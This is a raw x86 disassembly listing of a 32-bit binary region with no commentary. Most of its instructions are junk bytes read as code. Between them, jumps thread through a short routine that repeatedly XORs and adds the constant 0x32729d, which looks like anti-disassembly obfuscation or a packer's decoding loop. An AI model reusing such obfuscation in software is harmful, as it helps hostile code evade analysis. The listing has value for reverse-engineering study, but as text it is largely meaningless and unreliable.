  40cfc8:	int3   
  40cfc9:	inc    esi
  40cfca:	test   DWORD PTR [edx],0x7e7e894c
  40cfd0:	aas    
  40cfd1:	jg     0x40d051
  40cfd3:	jle    0x40d01e
  40cfd5:	pop    edx
  40cfd6:	mov    edi,0x72bb3b6b
  40cfdb:	xlat   BYTE PTR ds:[ebx]
  40cfdc:	dec    eax
  40cfdd:	stos   BYTE PTR es:[edi],al
  40cfde:	cmp    ecx,DWORD PTR [esi+0x95c3b6f]
  40cfe4:	(bad)  
  40cfe5:	fdivrp st(7),st
  40cfe7:	stos   BYTE PTR es:[edi],al
  40cfe8:	fidiv  DWORD PTR [ebx]
  40cfea:	inc    esp
  40cfeb:	scas   eax,DWORD PTR es:[edi]
  40cfec:	dec    edx
  40cfed:	mov    eax,0x521d1452
  40cff2:	lock (bad) 
  40cff5:	xchg   edi,eax
  40cff6:	hlt    
  40cff7:	mov    bl,0x35
  40cff9:	or     DWORD PTR [bx+di],ecx
  40cffc:	repnz pop ebx
  40cffe:	push   ds
  40cfff:	jae    0x40d04a
  40d001:	mov    ds:0x6a61b6a1,al
  40d006:	idiv   ebx
  40d008:	cmp    al,0xdc
  40d00a:	nop
  40d00b:	leave  
  40d00c:	mov    cl,0x8d
  40d00e:	ins    DWORD PTR es:[edi],dx
  40d00f:	pop    ecx
  40d010:	pop    es
  40d011:	push   esp
  40d012:	loop   0x40cfb1
  40d014:	in     al,0xca
  40d016:	(bad)  
  40d018:	cs dec esi
  40d01a:	repnz ds pushf 
  40d01d:	iret   
  40d01e:	outs   dx,DWORD PTR ds:[esi]
  40d01f:	mov    edx,0x76951e1b
  40d024:	xor    eax,ebx
  40d026:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d027:	mov    gs,edi
  40d029:	in     al,0xd5
  40d02b:	ss hlt 
  40d02d:	inc    edi
  40d02e:	in     al,dx
  40d02f:	mov    eax,0xaa323212
  40d034:	dec    edx
  40d035:	mov    dh,0x82
  40d037:	in     al,dx
  40d038:	pusha  
  40d039:	hlt    
  40d03a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d03b:	fsubr  DWORD PTR [edi-0x30]
  40d03e:	mov    ecx,cs
  40d040:	mov    eax,ds:0x703722a4
  40d045:	cld    
  40d046:	fisttp WORD PTR [edi+eiz*2-0x63462bd8]
  40d04d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d04e:	sub    ah,ch
  40d050:	fwait
  40d051:	out    0xf2,ax
  40d054:	cmp    eax,0x6cfb0d73
  40d059:	pop    edi
  40d05a:	cli    
  40d05b:	imul   ecx
  40d05d:	iret   
  40d05e:	fwait
  40d05f:	daa    
  40d060:	ins    BYTE PTR es:[edi],dx
  40d061:	loopne 0x40d058
  40d063:	lock push es
  40d065:	adc    ch,BYTE PTR [edi-0x2bd06573]
  40d06b:	(bad)  
  40d06c:	push   gs
  40d06e:	dec    edi
  40d06f:	ins    BYTE PTR es:[edi],dx
  40d070:	xchg   edi,eax
  40d071:	pusha  
  40d072:	pusha  
  40d073:	(bad)  
  40d074:	lods   eax,DWORD PTR ds:[esi]
  40d075:	cmp    BYTE PTR [ebx],0xf0
  40d078:	sub    cl,ch
  40d07a:	mov    ah,0xf2
  40d07c:	sbb    al,ch
  40d07e:	adc    eax,0x8b90790
  40d083:	cmp    al,0xf8
  40d085:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d086:	mov    ds,edi
  40d088:	out    0x2a,al
  40d08a:	jns    0x8f5e88cf
  40d090:	sub    DWORD PTR [eax+eiz*4],esp
  40d093:	mov    bh,0x7e
  40d095:	cmp    DWORD PTR ds:0xa131202,ebx
  40d09b:	popa   
  40d09c:	dec    esi
  40d09d:	aaa    
  40d09e:	fstp   DWORD PTR [ecx-0x75]
  40d0a1:	adc    ebx,DWORD PTR [esi]
  40d0a3:	cwde   
  40d0a4:	stos   DWORD PTR es:[edi],eax
  40d0a5:	xor    al,BYTE PTR [esi-0x1070b4a5]
  40d0ab:	xor    esi,DWORD PTR [esi]
  40d0ad:	ud2    
  40d0af:	push   0xd803a332
  40d0b4:	call   0xb81e:0x43beebcd
  40d0bb:	fisttp QWORD PTR [ebp+0x22]
  40d0be:	mov    esp,0x89af2f22
  40d0c3:	sbb    ecx,ecx
  40d0c5:	add    al,0x8d
  40d0c7:	(bad)  [ebp+0x1a]
  40d0ca:	or     esi,0x4a
  40d0cd:	sub    eax,eax
  40d0cf:	adc    edi,ebp
  40d0d1:	jns    0x40d0d2
  40d0d3:	stos   BYTE PTR es:[edi],al
  40d0d4:	mov    bl,BYTE PTR [edi+0x20c50872]
  40d0da:	out    dx,al
  40d0db:	lea    esi,[esi]
  40d0dd:	push   ebp
  40d0de:	jb     0x40d0bf
  40d0e0:	add    al,BYTE PTR [ebp-0x21a59703]
  40d0e6:	cli    
  40d0e7:	pop    es
  40d0e8:	sub    BYTE PTR [esi],ch
  40d0ea:	sahf   
  40d0eb:	mov    al,ds:0xdbbf0fe6
  40d0f0:	adc    ecx,ebx
  40d0f2:	xchg   edi,eax
  40d0f3:	in     eax,0x21
  40d0f5:	jns    0x40d099
  40d0f7:	mov    cl,0x3b
  40d0f9:	fdiv   DWORD PTR [esp]
  40d0fc:	sti    
  40d0fd:	ja     0x40d0f0
  40d0ff:	ss xor al,0x93
  40d102:	inc    esi
  40d103:	int    0xfe
  40d105:	sbb    DWORD PTR [edi+0x4fd7dd3b],edx
  40d10b:	addr16 mov ebx,0x6108e0e9
  40d111:	push   esi
  40d112:	shl    al,cl
  40d114:	aad    0x33
  40d116:	ror    DWORD PTR [ebx-0x7372f7b3],1
  40d11c:	or     bl,BYTE PTR [ebp+0x3b003272]
  40d122:	enter  0x840f,0xe9
  40d126:	add    eax,0x7d8b0000
  40d12b:	call   0x8b4916bb
  40d130:	push   ebp
  40d131:	adc    al,0x8b
  40d133:	inc    esp
  40d134:	add    BYTE PTR [ecx+edi*4],0x56
  40d138:	or     BYTE PTR [ecx+0x7],dl
  40d13b:	xor    edx,edx
  40d13d:	xor    edi,ecx
  40d13f:	mov    esi,0x32729d
  40d144:	add    edi,esi
  40d146:	div    edi
  40d148:	mov    edx,DWORD PTR [ebp-0x4]
  40d14b:	xor    edx,ecx
  40d14d:	jmp    0x40d2ab
  40d152:	jno    0x40d19e
  40d154:	cmp    eax,ecx
  40d156:	jge    0x40d1b9
  40d158:	in     eax,dx
  40d159:	pop    edx
  40d15a:	xor    ch,0xa8
  40d15d:	adc    BYTE PTR [edx+0xdd3851d],0x8b
  40d164:	jle    0x40d1e4
  40d166:	aas    
  40d167:	jg     0x40d1e7
  40d169:	jle    0x40d0f2
  40d16b:	pop    ebp
  40d16c:	call   0xb641:0xc5bd406
  40d173:	dec    BYTE PTR [edx+0x5f]
  40d176:	cld    
  40d177:	das    
  40d178:	pop    esi
  40d179:	mov    eax,ds:0xc23789de
  40d17e:	pop    ebx
  40d17f:	ret    
  40d180:	aad    0x7d
  40d182:	pop    ds
  40d183:	fidivr WORD PTR [edx-0x41]
  40d186:	(bad)  
  40d187:	fnstenv [edx]
  40d189:	in     eax,dx
  40d18a:	scas   eax,DWORD PTR es:[edi]
  40d18b:	push   edx
  40d18c:	je     0x40d19d
  40d18e:	jg     0x40d1d0
  40d190:	pop    ds
  40d191:	arpl   WORD PTR [ebx+0x6a2cf649],si
  40d197:	adc    eax,0x7e2848e3
  40d19c:	(bad)  
  40d19d:	cmp    ebp,DWORD PTR [ecx]
  40d19f:	enter  0xe10d,0x62
  40d1a3:	ins    BYTE PTR es:[edi],dx
  40d1a4:	adc    eax,0x419a28d4
  40d1a9:	jp     0x40d12f
  40d1ab:	ds aad 0xae
  40d1ae:	push   ebx
  40d1af:	xor    ebp,0x3cccdd1e
  40d1b5:	lds    eax,FWORD PTR [edx-0x34]
  40d1b8:	sub    eax,0x95aa72c
  40d1bd:	pop    ecx
  40d1be:	repz xor ebp,eax
  40d1c1:	mov    WORD PTR [edx+eiz*1],gs
  40d1c4:	(bad)  
  40d1c5:	xor    ecx,DWORD PTR [esi]
  40d1c7:	fwait
  40d1c8:	sub    al,0x41
  40d1ca:	aas    
  40d1cb:	mov    eax,0x2b495bdf
  40d1d0:	ins    BYTE PTR es:[edi],dx
  40d1d1:	add    eax,0x4bb40285
  40d1d6:	call   0xea838ac4
  40d1db:	sub    al,ah
  40d1dd:	jns    0x40d1a8
  40d1df:	jnp    0x40d22c
  40d1e1:	shl    BYTE PTR [eax+ecx*4-0x3041edde],1
  40d1e8:	in     eax,0x66
  40d1ea:	xchg   ebp,eax
  40d1eb:	lods   al,BYTE PTR ds:[esi]
  40d1ec:	pop    ss
  40d1ed:	mov    ecx,0xb68dec24
  40d1f2:	push   esp
  40d1f3:	imul   esi,edx,0xf6d2ae45
  40d1f9:	sub    eax,0x826fe259
  40d1fe:	pop    ds
  40d1ff:	push   eax
  40d200:	sar    dl,cl
  40d202:	mov    edx,0xe8c83c7a
  40d207:	fsub   st(5),st
  40d209:	and    dl,BYTE PTR [eax-0x24]
  40d20c:	cli    
  40d20d:	xlat   BYTE PTR ds:[ebx]
  40d20e:	add    eax,0x7e3604ab
  40d213:	add    eax,0x3cf22010
  40d218:	pop    ds
  40d219:	std    
  40d21a:	hlt    
  40d21b:	mov    eax,0xb4f38fff
  40d220:	fsub   st,st(1)
  40d222:	imul   ecx,esp,0x56
  40d225:	popa   
  40d226:	cli    
  40d227:	cdq    
  40d228:	in     al,dx
  40d229:	mov    eax,0xf6404427
  40d22e:	int    0x21
  40d230:	pop    edi
  40d231:	(bad)  
  40d232:	(bad)  
  40d233:	mov    ds:0x741e736,al
  40d238:	fld    TBYTE PTR [esi]
  40d23a:	push   ebp
  40d23b:	stos   DWORD PTR es:[edi],eax
  40d23c:	es pushf 
  40d23e:	scas   al,BYTE PTR es:[edi]
  40d23f:	jmp    0xdcb2f8fb
  40d244:	lods   eax,DWORD PTR ds:[esi]
  40d245:	test   al,0xf
  40d247:	push   0x39
  40d249:	inc    ecx
  40d24a:	inc    esi
  40d24b:	jle    0x40d224
  40d24d:	push   cs
  40d24e:	sbb    BYTE PTR [ecx-0x30c621e4],dl
  40d254:	xor    DWORD PTR [edi],0xffffffc7
  40d257:	cmp    DWORD PTR [eax+0x38790e32],eax
  40d25d:	mov    al,0x18
  40d25f:	add    DWORD PTR [edx-0x27],ebp
  40d262:	pop    esp
  40d263:	stc    
  40d264:	loopne 0x40d213
  40d266:	(bad)  
  40d267:	out    dx,eax
  40d268:	jo     0x40d21c
  40d26a:	pop    edi
  40d26b:	fmul   QWORD PTR [ecx+0x3cabae9a]
  40d271:	(bad)  
  40d272:	test   DWORD PTR [ebp+0x3fb31e81],0x56263a1
  40d27c:	cs add eax,0x367247c1
  40d282:	pop    esp
  40d283:	cli    
  40d284:	retf   0x7530
  40d287:	pop    edi
  40d288:	sub    DWORD PTR [ecx],esp
  40d28a:	call   0x5960:0xb5b8e91e
  40d291:	ret    0x5002
  40d294:	push   ebp
  40d295:	call   0x8a0a4d6c
  40d29a:	pop    ds
  40d29b:	xor    DWORD PTR [ecx],ecx
  40d29d:	adc    DWORD PTR [eax],edi
  40d29f:	jg     0x40d291
  40d2a1:	dec    esp
  40d2a2:	or     ecx,edx
  40d2a4:	mov    ds:0x205457b7,eax
  40d2a9:	inc    edx
  40d2aa:	aaa    
  40d2ab:	lea    eax,[edx+eax*1+0x32729d]
  40d2b2:	mov    edx,DWORD PTR [ebp+0x8]
  40d2b5:	mov    edi,DWORD PTR [ebp-0x24]
  40d2b8:	mov    DWORD PTR [edi+edx*4],eax
  40d2bb:	mov    eax,DWORD PTR [ebp-0x18]
  40d2be:	mov    edx,DWORD PTR [ebp+0x8]
  40d2c1:	xor    eax,ecx
  40d2c3:	lea    eax,[eax+edx*1+0x32729d]
  40d2ca:	mov    DWORD PTR [ebp+0x8],eax
  40d2cd:	mov    eax,DWORD PTR [ebp-0x18]
  40d2d0:	jmp    0x40d42e
  40d2d5:	cs adc al,0xbd
  40d2d8:	jecxz  0x40d297
  40d2da:	jnp    0x40d354
  40d2dc:	aad    0x3a
  40d2de:	lock mov al,0x98
  40d2e1:	pusha  
  40d2e2:	xchg   edi,eax
  40d2e3:	dec    ecx
  40d2e4:	jo     0x40d2b4
  40d2e6:	mov    WORD PTR [esi+0x7e],?
  40d2e9:	aas    
  40d2ea:	jg     0x40d36a
  40d2ec:	jle    0x40d2da
  40d2ee:	push   ds
  40d2ef:	and    bh,BYTE PTR ds:0xabe8a90
  40d2f5:	fsubr  QWORD PTR [ebp+eax*1+0x63b952e3]
  40d2fc:	outs   dx,BYTE PTR ds:[esi]
  40d2fd:	popa   
  40d2fe:	sbb    esp,DWORD PTR [ebx+0x4e06e487]
  40d304:	mov    al,0x53
  40d306:	mov    DWORD PTR [ebx+0x390460ce],0x44c87ac4
  40d310:	repnz dec ecx
  40d312:	jmp    0x40d336
  40d314:	pop    esi
  40d315:	adc    BYTE PTR [eax-0x125d5913],cl
  40d31b:	(bad)  
  40d31c:	mov    ds,WORD PTR [edx+eiz*2+0x7490596d]
  40d323:	clc    
  40d324:	push   ecx
  40d325:	dec    esp
  40d326:	cmp    ah,BYTE PTR [ecx+0x49c245c7]
  40d32c:	push   ebp
  40d32d:	dec    esp
  40d32e:	xchg   ecx,eax
  40d32f:	add    ebx,eax
  40d331:	stc    
  40d332:	imul   ch
  40d334:	ret    0xba3d
  40d337:	xor    al,0xfb
  40d339:	add    dl,BYTE PTR [esi+0x1d]
  40d33c:	in     al,0xab
  40d33e:	lods   al,BYTE PTR ds:[esi]
  40d33f:	gs jecxz 0x40d38a
  40d342:	jmp    0x54b4:0xad82475d
  40d349:	jecxz  0x40d31a
  40d34b:	or     DWORD PTR [eax+0x79c82079],0xdfee18d2
  40d355:	and    dl,BYTE PTR [edx]
  40d357:	sub    ax,0xa735
  40d35b:	mov    edx,0x93c6de6c
  40d360:	pop    esp
  40d361:	add    al,0x76
  40d363:	test   DWORD PTR [eax-0x7b],0xd5ec1c95
  40d36a:	sbb    ebp,ecx
  40d36c:	dec    ebx
  40d36d:	call   0xeb50:0x98a5a9f9
  40d374:	(bad)  
  40d376:	mov    BYTE PTR [edx-0x27],bl
  40d379:	sbb    al,0x84
  40d37b:	mov    ds:0x49db9c14,al
  40d380:	push   ebx
  40d381:	test   al,0xc2
  40d383:	stos   DWORD PTR es:[edi],eax
  40d384:	das    
  40d385:	mov    cl,0x8a
  40d387:	mov    edx,0x4a76a37f
  40d38c:	jnp    0x40d346
  40d38e:	sbb    eax,0x5328f537
  40d393:	push   0xd4427326
  40d398:	test   DWORD PTR [esi+ebx*2-0x7c],ecx
  40d39c:	mov    ch,0x54
  40d39e:	ds test bl,0xa5
  40d3a2:	add    al,0x1a
  40d3a4:	cmp    bh,0xd6
  40d3a7:	and    ah,BYTE PTR [esi+edi*8-0x7485f180]
  40d3ae:	test   al,0x43
  40d3b0:	in     al,dx
  40d3b1:	mov    BYTE PTR [esi],ch
  40d3b3:	fldl2t 
  40d3b5:	add    ah,BYTE PTR [ecx+0x1ddd2d44]
  40d3bb:	(bad)  [edi+eax*1-0x6127619c]
  40d3c2:	ds retf 
  40d3c4:	or     ah,dh
  40d3c6:	xchg   edi,eax
  40d3c7:	stos   DWORD PTR es:[edi],eax
  40d3c8:	mov    esp,0x37129dcb
  40d3cd:	add    eax,0x6b0656ed
  40d3d2:	retf   0x12aa
  40d3d5:	pop    esi
  40d3d6:	(bad)  
  40d3d7:	imul   DWORD PTR [esp+edi*2+0x61e66b96]
  40d3de:	std    
  40d3df:	pop    eax
  40d3e0:	int    0x78
  40d3e2:	loop   0x40d384
  40d3e4:	jg     0x40d44b
  40d3e6:	push   0xf6857804
  40d3eb:	sbb    al,0xf0
  40d3ed:	ds sbb eax,eax
  40d3f0:	imul   esi,DWORD PTR [edx+0x63c72c2a],0xd2bba48f
  40d3fa:	aaa    
  40d3fb:	xchg   ebp,eax
  40d3fc:	sbb    al,0xef
  40d3fe:	shl    ebx,cl
  40d400:	pop    edi
  40d401:	mov    edx,0x24a9bb9d
  40d406:	and    dl,BYTE PTR [esi]
  40d408:	test   BYTE PTR [edi-0x48],ch
  40d40b:	rcl    edi,0x7c
  40d40e:	fwait
  40d40f:	loopne 0x40d3b8
  40d411:	inc    edi
  40d412:	jns    0x40d400
  40d414:	sti    
  40d415:	jbe    0x40d421
  40d417:	cmp    al,0xe5
  40d419:	add    bh,BYTE PTR [edx-0x4b]
  40d41c:	dec    ebx
  40d41d:	xlat   BYTE PTR ds:[ebx]
  40d41e:	nop
  40d41f:	je     0x40d403
  40d421:	fs (bad) 
  40d423:	addr16 pop edi
  40d425:	and    edi,DWORD PTR [edi]
  40d427:	jl     0x40d47a
  40d429:	test   al,0x42
  40d42b:	(bad)  
  40d42d:	jecxz  0x40d3ba
  40d42f:	push   ebp
  40d430:	adc    al,0x33
  40d432:	rol    DWORD PTR [ebx],0xc6
  40d435:	imul   eax,DWORD PTR [edx]
  40d438:	jmp    0x40d596
  40d43d:	into   
  40d43e:	jb     0x40d482
  40d440:	pop    ecx
  40d441:	inc    edx
  40d442:	pop    ecx
  40d443:	fisttp QWORD PTR [ebp+0x677a88e4]
  40d449:	ss mov ch,0x1d
  40d44c:	dec    ebx
  40d44d:	(bad)  
  40d44e:	lea    edi,[esi+0x7e]
  40d451:	aas    
  40d452:	jg     0x40d4d2
  40d454:	jle    0x40d3e5
  40d456:	stos   BYTE PTR es:[edi],al
  40d457:	fdivr  DWORD PTR [ebx+0x28]
  40d45a:	into   
  40d45b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d45c:	test   al,0x1e
  40d45e:	and    DWORD PTR [edi+0x47],ebp
  40d461:	jmp    0x325eb32d
  40d466:	lods   al,BYTE PTR ds:[esi]
  40d467:	pop    esp
  40d468:	or     eax,0xffffffbd
  40d46b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d46c:	cmp    dl,BYTE PTR [ecx]
  40d46e:	mov    BYTE PTR [esi],ch
  40d470:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d471:	fs dec ebx
  40d473:	pushf  
  40d474:	in     al,dx
  40d475:	mov    esp,DWORD PTR [ecx+0x5162b8d2]
  40d47b:	mov    ebx,0x4d684939
  40d480:	mul    esp
  40d482:	jmp    0x495109c7
  40d487:	jmp    0x40d454
  40d489:	xchg   ebx,eax
  40d48a:	and    esi,DWORD PTR [ebx+0x7a]
  40d48d:	cmp    al,0x35
  40d48f:	adc    edi,DWORD PTR [edi+0xeb4d1c3]
  40d495:	icebp  
  40d496:	jmp    0x40d41c
  40d498:	cmp    BYTE PTR [ebp-0x14f982e],ah
  40d49e:	and    al,0xf5
  40d4a0:	fisubr WORD PTR [edx+0x7685105]
  40d4a6:	or     DWORD PTR [esi-0x176639f2],ecx
  40d4ac:	add    al,0x38
  40d4ae:	clc    
  40d4af:	ret    0x20b3
  40d4b2:	ds push ss
  40d4b4:	arpl   WORD PTR [ebx],ax
  40d4b6:	and    BYTE PTR [edx-0x33],dl
  40d4b9:	inc    esp
  40d4ba:	gs push esp
  40d4bc:	and    edi,DWORD PTR [edx+ecx*8]
  40d4bf:	inc    ecx
  40d4c0:	fwait
  40d4c1:	int    0x53
  40d4c3:	xchg   ebp,eax
  40d4c4:	jns    0x40d536
  40d4c6:	retf   
  40d4c7:	sub    DWORD PTR [ecx-0x71],ebp
  40d4ca:	and    BYTE PTR [edi+0x41],bl
  40d4cd:	arpl   WORD PTR [bx+di-0x39],di
  40d4d1:	test   DWORD PTR [eax],edi
  40d4d3:	push   edx
  40d4d4:	cdq    
  40d4d5:	inc    eax
  40d4d6:	out    0xa7,eax
  40d4d8:	fs jb  0x40d474
  40d4db:	sbb    BYTE PTR [ecx+esi*8],bh
  40d4de:	adc    BYTE PTR [edi+edi*1],dh
  40d4e1:	jno    0x40d546
  40d4e3:	push   ds
  40d4e4:	mov    eax,ds:0xc76ed604
  40d4e9:	pop    esi
  40d4ea:	cmp    eax,DWORD PTR [esi-0x1189141e]
  40d4f0:	jecxz  0x40d538
  40d4f2:	lods   al,BYTE PTR ds:[esi]
  40d4f3:	sub    eax,0xc4af9e15
  40d4f8:	nop
  40d4f9:	aas    
  40d4fa:	(bad)  
  40d4fb:	xchg   ebp,eax
  40d4fc:	nop
  40d4fd:	jecxz  0x40d4f7
  40d4ff:	pop    ss
  40d500:	push   ds
  40d501:	sub    BYTE PTR [ebx-0x57],0x35
  40d505:	xchg   edi,eax
  40d506:	(bad)  
  40d507:	loopne 0x40d563
  40d509:	mov    bh,0xa8
  40d50b:	lods   eax,DWORD PTR ds:[esi]
  40d50c:	scas   eax,DWORD PTR es:[edi]
  40d50d:	ss jmp 0x40d570
  40d510:	test   DWORD PTR ds:0x7e068cf0,edx
  40d516:	jnp    0x40d55b
  40d518:	loopne 0x40d541
  40d51a:	add    esi,eax
  40d51c:	(bad)  
  40d51d:	jmp    FWORD PTR [ecx+eax*1]
  40d520:	ret    
  40d521:	out    dx,eax
  40d522:	ja     0x40d59b
  40d524:	test   al,0xe
  40d526:	stos   BYTE PTR es:[edi],al
  40d527:	xlat   BYTE PTR ds:[ebx]
  40d528:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40d52a:	fsubr  st(2),st
  40d52c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d52d:	and    eax,0x8fe16d61
  40d532:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d533:	mov    ds:0x24a0e456,eax
  40d538:	lahf   
  40d539:	jl     0x40d529
  40d53b:	add    ecx,DWORD PTR [eax]
  40d53d:	pop    esp
  40d53e:	(bad)  
  40d53f:	mov    ds:0x2a94de76,eax
  40d544:	xor    al,al
  40d546:	pop    ebp
  40d547:	mov    edx,0x4585390e
  40d54c:	retf   0xad94
  40d54f:	outs   dx,DWORD PTR ds:[esi]
  40d550:	jbe    0x40d4f7
  40d552:	out    0x30,al
  40d554:	ja     0x40d5a9
  40d556:	or     edi,DWORD PTR [ebx]
  40d558:	push   edi
  40d559:	ret    
  40d55a:	add    DWORD PTR [ebp+0x26],edi
  40d55d:	into   
  40d55e:	or     ebp,ecx
  40d560:	and    BYTE PTR [eax],0xc2
  40d563:	iret   
  40d564:	loop   0x40d51e
  40d566:	jecxz  0x40d599
  40d568:	dec    ebp
  40d569:	push   ds
  40d56a:	stos   BYTE PTR es:[edi],al
  40d56b:	jmp    0xf9158656
  40d570:	(bad)  [edx-0x47af940b]
  40d576:	imul   DWORD PTR [ecx+0x38be2b1]
  40d57c:	aad    0x55
  40d57e:	popa   
  40d57f:	mov    ds:0xfe727372,al
  40d584:	mov    dh,0x5b
  40d586:	daa    
  40d587:	cld    
  40d588:	add    esi,ebp
  40d58a:	sub    BYTE PTR [ebx+0x33ed2d24],ch
  40d590:	xor    bl,BYTE PTR [ebp+0x2ddf1578]
  40d596:	mov    edx,DWORD PTR [ebp-0x4]
  40d599:	jmp    0x40d6f7
  40d59e:	out    0xf7,eax
  40d5a0:	cmp    dl,BYTE PTR [esi]
  40d5a2:	jp     0x40d55f
  40d5a4:	sti    
  40d5a5:	inc    edi
  40d5a6:	aaa    
  40d5a7:	mov    eax,0xf22cfe4c
  40d5ac:	sbb    ch,al
  40d5ae:	inc    eax
  40d5af:	mov    ?,WORD PTR [esi+0x7e]
  40d5b2:	aas    
  40d5b3:	jg     0x40d633
  40d5b5:	jle    0x40d5d5
  40d5b7:	repnz in al,0x89
  40d5ba:	adc    al,0x45
  40d5bc:	or     eax,0x940fda0
  40d5c1:	push   ecx
  40d5c2:	cmp    eax,0xf2b5e4ca
  40d5c7:	jecxz  0x40d5c6
  40d5c9:	mov    BYTE PTR [eax+0x69],dl
  40d5cc:	in     al,0xe0
  40d5ce:	cdq    
  40d5cf:	ret    
  40d5d0:	inc    ebp
  40d5d1:	in     al,dx
  40d5d2:	test   DWORD PTR [edi],ecx
  40d5d4:	das    
  40d5d5:	adc    eax,0x2137bdd1
  40d5da:	repz inc esi
  40d5dc:	nop
  40d5dd:	push   eax
  40d5de:	shr    DWORD PTR [eiz*4-0x55d859bc],cl
  40d5e5:	lds    ecx,FWORD PTR [ebx-0x6772935d]
  40d5eb:	repnz or DWORD PTR [edi+eiz*1+0x9],0xa58688f3
  40d5f4:	or     eax,0x26464464
  40d5f9:	ins    BYTE PTR es:[edi],dx
  40d5fa:	sub    al,0x44
  40d5fc:	push   ds
  40d5fd:	nop
  40d5fe:	adc    dh,bh
  40d600:	push   ss
  40d601:	adc    ecx,ebx
  40d603:	sbb    DWORD PTR [esi-0x5f6326e0],edi
  40d609:	stc    
  40d60a:	or     al,0xf1
  40d60c:	mov    bl,0x90
  40d60e:	mov    cl,0x2d
  40d610:	outs   dx,DWORD PTR ds:[esi]
  40d611:	sub    DWORD PTR [edx],esi
  40d613:	xchg   ebp,eax
  40d614:	clc    
  40d615:	fcom   st(2)
  40d617:	dec    ecx
  40d618:	sub    eax,DWORD PTR [ebx-0x6a]
  40d61b:	mov    al,0xb0
  40d61d:	outs   dx,BYTE PTR ds:[esi]
  40d61e:	push   0x36
  40d620:	(bad)  
  40d621:	iret   
  40d622:	xchg   dl,al
  40d624:	std    
  40d625:	pop    ss
  40d626:	(bad)  
  40d627:	iret   
  40d628:	or     BYTE PTR [eax-0x3d],bl
  40d62b:	mov    ebp,0xac5fb337
  40d630:	push   esp
  40d631:	fdivr  st(7),st
  40d633:	cdq    
  40d634:	inc    edx
  40d635:	out    0xb2,al
  40d637:	jmp    0x40d618
  40d639:	jmp    0x3f0fcc60
  40d63e:	pop    ebx
  40d63f:	scas   eax,DWORD PTR es:[edi]
  40d640:	add    ebp,ebp
  40d642:	sar    al,1
  40d644:	pop    eax
  40d645:	add    eax,esp
  40d647:	scas   al,BYTE PTR es:[edi]
  40d648:	loop   0x40d638
  40d64a:	push   esp
  40d64b:	inc    ebx
  40d64c:	inc    esp
  40d64d:	cmp    eax,0x6a3b81e
  40d652:	lds    ebp,FWORD PTR [eax-0xa]
  40d655:	inc    edx
  40d656:	jecxz  0x40d5de
  40d658:	imul   edi,DWORD PTR [ecx+0x29a108ff],0xffffff82
  40d65f:	inc    ecx
  40d660:	ffree  st(0)
  40d662:	pop    edi
  40d663:	xchg   esi,eax
  40d664:	ins    DWORD PTR es:[edi],dx
  40d665:	xchg   esp,eax
  40d667:	in     eax,0x2
  40d669:	xchg   edi,ecx
  40d66b:	in     eax,0x9f
  40d66d:	pop    edi
  40d66e:	ret    0x881d
  40d671:	inc    BYTE PTR [eax+0x7cac43ca]
  40d677:	into   
  40d678:	aam    0x74
  40d67a:	mov    esp,0xd9dfeb0
  40d67f:	nop
  40d680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d681:	xchg   ecx,eax
  40d682:	aas    
  40d683:	sbb    BYTE PTR [ebx-0x78],ch
  40d686:	call   0xc3801b6a
  40d68b:	les    esp,FWORD PTR [ecx-0x476886d5]
  40d691:	mov    ds:0x5e30a6c6,eax
  40d696:	mov    eax,DWORD PTR [ebp-0x37]
  40d699:	popf   
  40d69a:	dec    edi
  40d69b:	jbe    0x40d646
  40d69d:	xchg   cl,ah
  40d69f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6a0:	aad    0x8e
  40d6a2:	sbb    dh,BYTE PTR [eax+edi*4-0x9]
  40d6a6:	sub    dh,BYTE PTR [edx]
  40d6a8:	stc    
  40d6a9:	not    BYTE PTR [edx+eiz*8]
  40d6ac:	and    DWORD PTR [edx+ebp*8],edx
  40d6af:	dec    esp
  40d6b0:	sub    dl,bl
  40d6b2:	mov    edx,DWORD PTR ds:0xd9b81bd4
  40d6b8:	jmp    0xfea5dd76
  40d6bd:	out    dx,al
  40d6be:	test   bl,ah
  40d6c0:	mov    edi,0xd79a85c1
  40d6c5:	(bad)  
  40d6c6:	xor    edi,DWORD PTR [ecx+0x4319695e]
  40d6cc:	mov    DWORD PTR [edi],esi
  40d6ce:	fmul   DWORD PTR [edx-0x7677eccc]
  40d6d4:	push   edx
  40d6d5:	jae    0x40d6be
  40d6d7:	das    
  40d6d8:	inc    dh
  40d6da:	in     al,0xfd
  40d6dc:	mov    bl,0xf4
  40d6de:	adc    ebp,DWORD PTR [edi+0x1f]
  40d6e1:	and    DWORD PTR [edi+0xc],eax
  40d6e4:	mov    eax,0xc3c552a3
  40d6e9:	out    dx,eax
  40d6ea:	xchg   esi,eax
  40d6eb:	pushf  
  40d6ec:	std    
  40d6ed:	dec    eax
  40d6ee:	or     esi,edi
  40d6f0:	add    DWORD PTR [edi+0x7c78cbc7],ecx
  40d6f6:	in     eax,dx
  40d6f7:	xor    edx,ecx
  40d6f9:	mov    ecx,DWORD PTR [ebp+0x8]
  40d6fc:	lea    ecx,[edx+ecx*1+0x32729d]
  40d703:	cmp    ecx,eax
  40d705:	jne    0x40d129
  40d70b:	mov    ebx,esi
  40d70d:	jmp    0x40d717
  40d712:	mov    ebx,0x32729d
  40d717:	mov    eax,DWORD PTR [ebp-0x4]
  40d71a:	xor    eax,0x7510856
  40d71f:	add    eax,ebx
  40d721:	mov    DWORD PTR [ebp-0xc],eax
  40d724:	xor    ebx,ebx
  40d726:	lea    eax,[ebp-0x10]
  40d729:	add    ebx,DWORD PTR [eax]
  40d72b:	jmp    0x40d889
  40d730:	xchg   ebp,eax
  40d731:	pop    es
  40d732:	mov    ds:0xa5aabdfe,eax
  40d737:	cmp    eax,0xb6db83b1
  40d73c:	bound  edi,QWORD PTR [eax-0x7ffeb4ea]
  40d742:	jle    0x40d7c2
  40d744:	aas    
  40d745:	jg     0x40d7c5
  40d747:	jle    0x40d6e6
  40d749:	aam    0x83
